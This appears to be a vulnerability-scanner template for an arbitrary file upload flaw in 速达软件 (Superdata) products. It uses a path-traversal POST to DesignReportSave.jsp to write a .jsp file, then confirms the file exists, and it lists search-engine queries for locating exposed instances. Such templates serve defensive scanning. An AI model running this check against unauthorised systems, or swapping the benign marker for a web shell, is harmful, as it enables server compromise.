id: superdata-designreportsave-fileupload

info:
  name: 速达软件任意文件上传漏洞
  author: zan8in
  severity: high
  verified: true
  description: |-
    Fofa: app="速达软件-公司产品"
    ZoomEye: app:"速达软件 产品"
  reference: 
    - https://mp.weixin.qq.com/s/3JnIy0-lpacXFpPD6rB6gQ
  tags: superdata,fileread
  created: 2023/12/12

set:
  randstr: randomLowercase(4)
  randbody: randomLowercase(32)
rules:
  r0:
    request:
      method: POST
      path: /report/DesignReportSave.jsp?report=../{{randstr}}.jsp
      headers:
        Content-Type: application/octet-stream
      body: "{{randbody}}"
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /{{randstr}}.jsp
    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
expression: r0() && r1()
        
